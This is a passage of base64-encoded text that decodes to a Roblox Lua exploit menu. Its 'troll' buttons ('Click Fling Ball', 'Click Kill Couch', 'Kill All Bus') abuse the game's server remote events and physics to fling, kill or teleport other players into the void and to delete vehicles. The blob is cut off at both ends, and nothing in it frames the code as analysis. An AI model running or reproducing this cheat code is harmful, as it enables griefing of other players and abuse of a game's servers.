SBmYWxzZQoJCQlmbGluZ1dpdGhDb3VjaCh0YXJnZXQpCgkJCXRhc2suZGVsYXkoMiwgZnVuY3Rpb24oKQoJCQkJY2FuQ2xpY2sgPSB0cnVlCgkJCWVuZCkKCQllbmQKCWVuZAplbmQpCmVuZAp9KQoKVHJvbGxBZGRCdXR0b24oewogICAgTmFtZSA9IENsaWNrIEZsaW5nIEJhbGwgKFRvb2wpLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCmxvY2FsIHBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQpsb2NhbCByZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKQpsb2NhbCB3b3JsZCA9IGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSkKbG9jYWwgdXNlcklucHV0ID0gZ2FtZUdldFNlcnZpY2UoVXNlcklucHV0U2VydmljZSkKbG9jYWwgY2FtZXJhID0gd29ybGQuQ3VycmVudENhbWVyYQpsb2NhbCBsb2NhbFBsYXllciA9IHBsYXllcnMuTG9jYWxQbGF5ZXIKCmxvY2FsIFRPT0xfTkFNRSA9IENsaWNrIEZsaW5nIEJhbGwKbG9jYWwgdG9vbEVxdWlwcGVkID0gZmFsc2UKCmxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXJXYWl0Rm9yQ2hpbGQoQmFja3BhY2spCmlmIG5vdCBiYWNrcGFja0ZpbmRGaXJzdENoaWxkKFRPT0xfTkFNRSkgdGhlbgoJbG9jYWwgdG9vbCA9IEluc3RhbmNlLm5ldyhUb29sKQoJdG9vbC5OYW1lID0gVE9PTF9OQU1FCgl0b29sLlJlcXVpcmVzSGFuZGxlID0gZmFsc2UKCXRvb2wuQ2FuQmVEcm9wcGVkID0gZmFsc2UKCgl0b29sLkVxdWlwcGVkQ29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gdHJ1ZQoJZW5kKQoKCXRvb2wuVW5lcXVpcHBlZENvbm5lY3QoZnVuY3Rpb24oKQoJCXRvb2xFcXVpcHBlZCA9IGZhbHNlCgllbmQpCgoJdG9vbC5QYXJlbnQgPSBiYWNrcGFjawplbmQKCi0tIEZsaW5nQmFsbCBmdW5jdGlvbiAoYmFsbCkKbG9jYWwgZnVuY3Rpb24gRmxpbmdCYWxsKHRhcmdldCkKICAgIAoKICAgIGxvY2FsIHBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQogICAgbG9jYWwgcGxheWVyID0gcGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkKQogICAgbG9jYWwgaHJwID0gY2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcldhaXRGb3JDaGlsZChCYWNrcGFjaykKICAgIGxvY2FsIFNlcnZlckJhbGxzID0gd29ya3NwYWNlLldvcmtzcGFjZUNvbVdhaXRGb3JDaGlsZCgwMDFfU29jY2VyQmFsbHMpCgogICAgbG9jYWwgZnVuY3Rpb24gR2V0QmFsbCgpCiAgICAgICAgaWYgbm90IGJhY2twYWNrRmluZEZpcnN0Q2hpbGQoU29jY2VyQmFsbCkgYW5kIG5vdCBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChTb2NjZXJCYWxsKSB0aGVuCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbClJbnZva2VTZXJ2ZXIoUGlja2luZ1Rvb2xzLCBTb2NjZXJCYWxsKQogICAgICAgIGVuZAoKICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgYmFja3BhY2tGaW5kRmlyc3RDaGlsZChTb2NjZXJCYWxsKSBvciBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChTb2NjZXJCYWxsKQoKICAgICAgICBsb2NhbCBiYWxsVG9vbCA9IGJhY2twYWNrRmluZEZpcnN0Q2hpbGQoU29jY2VyQmFsbCkKICAgICAgICBpZiBiYWxsVG9vbCB0aGVuCiAgICAgICAgICAgIGJhbGxUb29sLlBhcmVudCA9IGNoYXJhY3RlcgogICAgICAgIGVuZAoKICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgU2VydmVyQmFsbHNGaW5kRmlyc3RDaGlsZChTb2NjZXIgLi4gcGxheWVyLk5hbWUpCgogICAgICAgIHJldHVybiBTZXJ2ZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2NlciAuLiBwbGF5ZXIuTmFtZSkKICAgIGVuZAoKICAgIGxvY2FsIEJhbGwgPSBTZXJ2ZXJCYWxsc0ZpbmRGaXJzdENoaWxkKFNvY2NlciAuLiBwbGF5ZXIuTmFtZSkgb3IgR2V0QmFsbCgpCiAgICBCYWxsLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgQmFsbC5NYXNzbGVzcyA9IHRydWUKICAgIEJhbGwuQ3VzdG9tUGh5c2ljYWxQcm9wZXJ0aWVzID0gUGh5c2ljYWxQcm9wZXJ0aWVzLm5ldygwLjAwMDEsIDAsIDApCgogICAgaWYgdGFyZ2V0IH49IHBsYXllciB0aGVuCiAgICAgICAgbG9jYWwgdGNoYXIgPSB0YXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgaWYgdGNoYXIgYW5kIHRjaGFyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgYW5kIHRjaGFyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWQpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdHJvb3QgPSB0Y2hhci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgIGxvY2FsIHRodW0gPSB0Y2hhci5IdW1hbm9pZAoKICAgICAgICAgICAgaWYgQmFsbEZpbmRGaXJzdENoaWxkV2hpY2hJc0EoQm9keVZlbG9jaXR5KSB0aGVuCiAgICAgICAgICAgICAgICBCYWxsRmluZEZpcnN0Q2hpbGRXaGljaElzQShCb2R5VmVsb2NpdHkpRGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5KQogICAgICAgICAgICBidi5OYW1lID0gRmxpbmdQb3dlcgogICAgICAgICAgICBidi5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDllOCwgOWU4LCA5ZTgpCiAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICAgICAgYnYuUCA9IDllOTAwCiAgICAgICAgICAgIGJ2LlBhcmVudCA9IEJhbGwKCiAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSB0aHVtCgogICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgIGlmIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcG9zID0gdHJvb3QuUG9zaXRpb24gKyAodHJvb3QuVmVsb2NpdHkgIDEuNSkKICAgICAgICAgICAgICAgICAgICBCYWxsLkNGcmFtZSA9IENGcmFtZS5uZXcocG9zKQogICAgICAgICAgICAgICAgICAgIEJhbGwuT3JpZW50YXRpb24gKz0gVmVjdG9yMy5uZXcoNDUsIDYwLCAzMCkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBmb3IgaSwgdiBpbiBwYWlycyh0Y2hhckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHZJc0EoQmFzZVBhcnQpIGFuZCB2LkNhbkNvbGxpZGUgYW5kIG5vdCB2LkFuY2hvcmVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhbGwuQ0ZyYW1lID0gdi5DRnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxNjAwMCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxNjAwMCkKICAgICAgICAgICAgdW50aWwgdHJvb3QuVmVsb2NpdHkuTWFnbml0dWRlICAxMDAwIG9yIHRodW0uSGVhbHRoID0gMCBvciBub3QgdGNoYXJJc0Rlc2NlbmRhbnRPZih3b3Jrc3BhY2UpIG9yIHRhcmdldC5QYXJlbnQgfj0gcGxheWVycwoKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgotLSBUb3VjaCBzY3JlZW4gdG8gYXBwbHkgYmFsbAp1c2VySW5wdXQuVG91Y2hUYXBDb25uZWN0KGZ1bmN0aW9uKHRvdWNoZXMsIHByb2Nlc3NlZCkKCWlmIG5vdCB0b29sRXF1aXBwZWQgb3IgcHJvY2Vzc2VkIHRoZW4gcmV0dXJuIGVuZAoJbG9jYWwgcG9zID0gdG91Y2hlc1sxXQoJbG9jYWwgcmF5ID0gY2FtZXJhU2NyZWVuUG9pbnRUb1JheShwb3MuWCwgcG9zLlkpCglsb2NhbCBoaXQgPSB3b3JsZFJheWNhc3QocmF5Lk9yaWdpbiwgcmF5LkRpcmVjdGlvbiAgMTAwMCkKCWlmIGhpdCBhbmQgaGl0Lkluc3RhbmNlIHRoZW4KCQlsb2NhbCBtb2RlbCA9IGhpdC5JbnN0YW5jZUZpbmRGaXJzdEFuY2VzdG9yT2ZDbGFzcyhNb2RlbCkKCQlsb2NhbCBwbGF5ZXIgPSBwbGF5ZXJzR2V0UGxheWVyRnJvbUNoYXJhY3Rlcihtb2RlbCkKCQlpZiBwbGF5ZXIgYW5kIHBsYXllciB+PSBsb2NhbFBsYXllciB0aGVuCgkJCUZsaW5nQmFsbChwbGF5ZXIpCgkJZW5kCgllbmQKZW5kKQoKZW5kCn0pCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gQ2xpY2sgS2lsbCBDb3VjaCAoVG9vbCksCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKCmxvY2FsIHBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQpsb2NhbCByZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKQpsb2NhbCBydW5TZXJ2aWNlID0gZ2FtZUdldFNlcnZpY2UoUnVuU2VydmljZSkKbG9jYWwgd29ybGQgPSBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpCmxvY2FsIHVzZXJJbnB1dCA9IGdhbWVHZXRTZXJ2aWNlKFVzZXJJbnB1dFNlcnZpY2UpCgpsb2NhbCBsb2NhbFBsYXllciA9IHBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgY2FtZXJhID0gd29ybGQuQ3VycmVudENhbWVyYQoKbG9jYWwgVE9PTF9OQU1FID0gQ2xpY2sgS2lsbCBDb3VjaApsb2NhbCB0b29sRXF1aXBwZWQgPSBmYWxzZQpsb2NhbCB0YXJnZXROYW1lID0gbmlsCmxvY2FsIHRwTG9vcCA9IG5pbApsb2NhbCBjb3VjaEVxdWlwcGVkID0gZmFsc2UKbG9jYWwgYmFzZVBhcnQgPSBuaWwKbG9jYWwgaW5pdGlhbFBvcyA9IG5pbApsb2NhbCByb290UGFydCA9IG5pbAoKbG9jYWwgYmFja3BhY2sgPSBsb2NhbFBsYXllcldhaXRGb3JDaGlsZChCYWNrcGFjaykKaWYgbm90IGJhY2twYWNrRmluZEZpcnN0Q2hpbGQoVE9PTF9OQU1FKSB0aGVuCglsb2NhbCB0b29sID0gSW5zdGFuY2UubmV3KFRvb2wpCgl0b29sLk5hbWUgPSBUT09MX05BTUUKCXRvb2wuUmVxdWlyZXNIYW5kbGUgPSBmYWxzZQoJdG9vbC5DYW5CZURyb3BwZWQgPSBmYWxzZQoKCXRvb2wuRXF1aXBwZWRDb25uZWN0KGZ1bmN0aW9uKCkKCQl0b29sRXF1aXBwZWQgPSB0cnVlCgllbmQpCgoJdG9vbC5VbmVxdWlwcGVkQ29ubmVjdChmdW5jdGlvbigpCgkJdG9vbEVxdWlwcGVkID0gZmFsc2UKCQl0YXJnZXROYW1lID0gbmlsCgkJY2xlYW51cENvdWNoKCkKCWVuZCkKCgl0b29sLlBhcmVudCA9IGJhY2twYWNrCmVuZAoKZnVuY3Rpb24gY2xlYW51cENvdWNoKCkKCWlmIHRwTG9vcCB0aGVuCgkJdHBMb29wRGlzY29ubmVjdCgpCgkJdHBMb29wID0gbmlsCgllbmQKCglpZiBjb3VjaEVxdWlwcGVkIHRoZW4KCQlsb2NhbCBjaGFyYWN0ZXIgPSBsb2NhbFBsYXllci5DaGFyYWN0ZXIKCQlpZiBjaGFyYWN0ZXIgdGhlbgoJCQlsb2NhbCBjb3VjaCA9IGNoYXJhY3RlckZpbmRGaXJzdENoaWxkKENvdWNoKQoJCQlpZiBjb3VjaCB0aGVuCgkJCQljb3VjaC5QYXJlbnQgPSBsb2NhbFBsYXllci5CYWNrcGFjawoJCQkJY291Y2hFcXVpcHBlZCA9IGZhbHNlCgkJCWVuZAoJCWVuZAoJZW5kCgoJaWYgYmFzZVBhcnQgdGhlbgoJCWJhc2VQYXJ0RGVzdHJveSgpCgkJYmFzZVBhcnQgPSBuaWwKCWVuZAoKCWlmIGdldGdlbnYoKS5BbnRpU2l0IHRoZW4KCQlnZXRnZW52KCkuQW50aVNpdFNldChmYWxzZSkKCWVuZAoKCWxvY2FsIGh1bWFub2lkID0gbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBsb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCglpZiBodW1hbm9pZCB0aGVuCgkJaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5QaHlzaWNzLCB0cnVlKQoJCWh1bWFub2lkQ2hhbmdlU3RhdGUoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5HZXR0aW5nVXApCgllbmQKCglpZiBpbml0aWFsUG9zIGFuZCByb290UGFydCB0aGVuCgkJcm9vdFBhcnQuQ0ZyYW1lID0gaW5pdGlhbFBvcwoJCWluaXRpYWxQb3MgPSBuaWwKCWVuZAplbmQKCmZ1bmN0aW9uIGdldENvdWNoKCkKCWxvY2FsIGNoYXJhY3RlciA9IGxvY2FsUGxheWVyLkNoYXJhY3RlcgoJaWYgbm90IGNoYXJhY3RlciB0aGVuIHJldHVybiBlbmQKCWxvY2FsIGJhY2twYWNrID0gbG9jYWxQbGF5ZXIuQmFja3BhY2sKCglpZiBub3QgYmFja3BhY2tGaW5kRmlyc3RDaGlsZChDb3VjaCkgYW5kIG5vdCBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChDb3VjaCkgdGhlbgoJCWxvY2FsIGFyZ3MgPSB7IFBpY2tpbmdUb29scywgQ291Y2ggfQoJCXJlcGxpY2F0ZWRTdG9yYWdlLlJFWzFUb28xbF1JbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQoJCXRhc2sud2FpdCgwLjEpCgllbmQKCglsb2NhbCBjb3VjaCA9IGJhY2twYWNrRmluZEZpcnN0Q2hpbGQoQ291Y2gpIG9yIGNoYXJhY3RlckZpbmRGaXJzdENoaWxkKENvdWNoKQoJaWYgY291Y2ggdGhlbgoJCWNvdWNoLlBhcmVudCA9IGNoYXJhY3RlcgoJCWNvdWNoRXF1aXBwZWQgPSB0cnVlCgllbmQKZW5kCgpmdW5jdGlvbiBnZXRSYW5kb21Qb3NpdGlvbkJlbG93KGNoYXJhY3RlcikKCWxvY2FsIHJwID0gY2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKCWlmIG5vdCBycCB0aGVuIHJldHVybiBWZWN0b3IzLm5ldygpIGVuZAoJbG9jYWwgb2Zmc2V0ID0gVmVjdG9yMy5uZXcobWF0aC5yYW5kb20oLTIsIDIpLCAtNS4xLCBtYXRoLnJhbmRvbSgtMiwgMikpCglyZXR1cm4gcnAuUG9zaXRpb24gKyBvZmZzZXQKZW5kCgpmdW5jdGlvbiB0cEJlbG93KHRhcmdldCkKCWlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KSB0aGVuIHJldHVybiBlbmQKCglsb2NhbCBteUNoYXJhY3RlciA9IGxvY2FsUGxheWVyLkNoYXJhY3RlcgoJbG9jYWwgbXlSb290UGFydCA9IG15Q2hhcmFjdGVyIGFuZCBteUNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCglsb2NhbCBodW1hbm9pZCA9IG15Q2hhcmFjdGVyIGFuZCBteUNoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKCglpZiBub3QgbXlSb290UGFydCBvciBub3QgaHVtYW5vaWQgdGhlbiByZXR1cm4gZW5kCgoJaHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5QaHlzaWNzLCBmYWxzZSkKCglpZiBub3QgYmFzZVBhcnQgdGhlbgoJCWJhc2VQYXJ0ID0gSW5zdGFuY2UubmV3KFBhcnQpCgkJYmFzZVBhcnQuU2l6ZSA9IFZlY3RvcjMubmV3KDEwLCAxLCAxMCkKCQliYXNlUGFydC5BbmNob3JlZCA9IHRydWUKCQliYXNlUGFydC5DYW5Db2xsaWRlID0gdHJ1ZQoJCWJhc2VQYXJ0LlRyYW5zcGFyZW5jeSA9IDAuNQoJCWJhc2VQYXJ0LlBhcmVudCA9IHdvcmxkCgllbmQKCglsb2NhbCBkZXN0aW5hdGlvbiA9IGdldFJhbmRvbVBvc2l0aW9uQmVsb3codGFyZ2V0LkNoYXJhY3RlcikKCWJhc2VQYXJ0LlBvc2l0aW9uID0gZGVzdGluYXRpb24KCW15Um9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhkZXN0aW5hdGlvbikKCglodW1hbm9pZFNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlBoeXNpY3MsIHRydWUpCmVuZAoKZnVuY3Rpb24gdGhyb3dXaXRoQ291Y2godGFyZ2V0KQoJaWYgbm90IHRhcmdldCB0aGVuIHJldHVybiBlbmQKCXRhcmdldE5hbWUgPSB0YXJnZXQuTmFtZQoJbG9jYWwgY2hhcmFjdGVyID0gbG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCglpZiBub3QgY2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAoKCWluaXRpYWxQb3MgPSBjaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KSBhbmQgY2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCglyb290UGFydCA9IGNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCglnZXRDb3VjaCgpCgoJdHBMb29wID0gcnVuU2VydmljZS5IZWFydGJlYXRDb25uZWN0KGZ1bmN0aW9uKCkKCQlsb2NhbCBjdXJyZW50VGFyZ2V0ID0gcGxheWVyc0ZpbmRGaXJzdENoaWxkKHRhcmdldE5hbWUpCgkJaWYgbm90IGN1cnJlbnRUYXJnZXQgb3Igbm90IGN1cnJlbnRUYXJnZXQuQ2hhcmFjdGVyIG9yIG5vdCBjdXJyZW50VGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkKSB0aGVuCgkJCWNsZWFudXBDb3VjaCgpCgkJCXJldHVybgoJCWVuZAoJCWlmIGdldGdlbnYoKS5BbnRpU2l0IHRoZW4KCQkJZ2V0Z2VudigpLkFudGlTaXRTZXQodHJ1ZSkKCQllbmQKCQl0cEJlbG93KGN1cnJlbnRUYXJnZXQpCgllbmQpCgoJdGFzay5zcGF3bihmdW5jdGlvbigpCgkJbG9jYWwgY3VycmVudFRhcmdldCA9IHBsYXllcnNGaW5kRmlyc3RDaGlsZCh0YXJnZXROYW1lKQoJCXdoaWxlIGN1cnJlbnRUYXJnZXQgYW5kIGN1cnJlbnRUYXJnZXQuQ2hhcmFjdGVyIGFuZCBjdXJyZW50VGFyZ2V0LkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkKSBkbwoJCQl0YXNrLndhaXQoMC4wNSkKCQkJaWYgY3VycmVudFRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWQuU2VhdFBhcnQgdGhlbgoJCQkJbG9jYWwgdm9pZFBvc2l0aW9uID0gQ0ZyYW1lLm5ldygyNjUuNDYsIC00NTAuODMsIC01OS45MykKCQkJCWN1cnJlbnRUYXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gdm9pZFBvc2l0aW9uCgkJCQlsb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSB2b2lkUG9zaXRpb24KCQkJCXRhc2sud2FpdCgwLjQpCgkJCQljbGVhbnVwQ291Y2goKQoJCQkJdGFzay53YWl0KDAuMikKCQkJCWlmIGluaXRpYWxQb3MgdGhlbgoJCQkJCWxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IGluaXRpYWxQb3MKCQkJCWVuZAoJCQkJYnJlYWsKCQkJZW5kCgkJZW5kCgllbmQpCmVuZAoKdXNlcklucHV0LlRvdWNoVGFwQ29ubmVjdChmdW5jdGlvbih0b3VjaGVzLCBwcm9jZXNzZWQpCglpZiBub3QgdG9vbEVxdWlwcGVkIG9yIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBvcyA9IHRvdWNoZXNbMV0KCWxvY2FsIHJheSA9IGNhbWVyYVNjcmVlblBvaW50VG9SYXkocG9zLlgsIHBvcy5ZKQoJbG9jYWwgaGl0ID0gd29ybGRSYXljYXN0KHJheS5PcmlnaW4sIHJheS5EaXJlY3Rpb24gIDEwMDApCglpZiBoaXQgYW5kIGhpdC5JbnN0YW5jZSB0aGVuCgkJbG9jYWwgbW9kZWwgPSBoaXQuSW5zdGFuY2VGaW5kRmlyc3RBbmNlc3Rvck9mQ2xhc3MoTW9kZWwpCgkJbG9jYWwgcGxheWVyID0gcGxheWVyc0dldFBsYXllckZyb21DaGFyYWN0ZXIobW9kZWwpCgkJaWYgcGxheWVyIGFuZCBwbGF5ZXIgfj0gbG9jYWxQbGF5ZXIgdGhlbgoJCQl0aHJvd1dpdGhDb3VjaChwbGF5ZXIpCgkJZW5kCgllbmQKZW5kKQplbmQKfSkKCmxvY2FsIGtpbGwgPSBUcm9sbEFkZFNlY3Rpb24oe05hbWUgPSBBbGwgbWV0aG9kc30pCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gS2lsbCBBbGwgQnVzLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgUGxheWVycyA9IGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSkKbG9jYWwgUnVuU2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFJ1blNlcnZpY2UpCmxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpCgpsb2NhbCBkZXN0aW5hdGlvbiA9IFZlY3RvcjMubmV3KDE0NS41MSwgLTM3NC4wOSwgMjEuNTgpIApsb2NhbCBvcmlnaW5hbFBvc2l0aW9uID0gbmlsICAKCmxvY2FsIGZ1bmN0aW9uIEdldEJ1cygpICAKICAgIGxvY2FsIHZlaGljbGVzID0gV29ya3NwYWNlRmluZEZpcnN0Q2hpbGQoVmVoaWNsZXMpICAKICAgIGlmIHZlaGljbGVzIHRoZW4gIAogICAgICAgIHJldHVybiB2ZWhpY2xlc0ZpbmRGaXJzdENoaWxkKFBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZS4uQ2FyKSAgCiAgICBlbmQgIAogICAgcmV0dXJuIG5pbCAgCmVuZCAgCgpsb2NhbCBmdW5jdGlvbiBUcmFja1BsYXllcihzZWxlY3RlZFBsYXllck5hbWUsIGNhbGxiYWNrKQogICAgd2hpbGUgdHJ1ZSBkbyAgCiAgICAgICAgaWYgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4gIAogICAgICAgICAgICBsb2NhbCB0YXJnZXRQbGF5ZXIgPSBQbGF5ZXJzRmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSAgCiAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpIHRoZW4gIAogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SHVtYW5vaWQgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKSAgCiAgICAgICAgICAgICAgICBpZiB0YXJnZXRIdW1hbm9pZCBhbmQgdGFyZ2V0SHVtYW5vaWQuU2l0IHRoZW4gIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ1cyA9IEdldEJ1cygpCiAgICAgICAgICAgICAgICAgICAgaWYgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYnVzU2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhkZXN0aW5hdGlvbikpICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KFBsYXllciBzYXQgZG93biwgdGFraW5nIGJ1cyB0byB0aGUgdm9pZCEpICAKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpICAKCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNpbXVsYXRlSnVtcCgpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIFBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRXaGljaElzQShIdW1hbm9pZCkgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbiAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcpICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAgCgogICAgICAgICAgICAgICAgICAgICAgICBzaW11bGF0ZUp1bXAoKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KFNpbXVsYXRpbmcgZmlyc3QganVtcCEpICAKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpICAKICAgICAgICAgICAgICAgICAgICAgICAgc2ltdWxhdGVKdW1wKCkKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoU2ltdWxhdGluZyBzZWNvbmQganVtcCEpICAKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9yaWdpbmFsUG9zaXRpb24gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvcmlnaW5hbFBvc2l0aW9uICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KFBsYXllciByZXR1cm5lZCB0byBpbml0aWFsIHBvc2l0aW9uLikgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsxXSA9IERlbGV0ZUFsbFZlaGljbGVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZVdhaXRGb3JDaGlsZChSRSlXY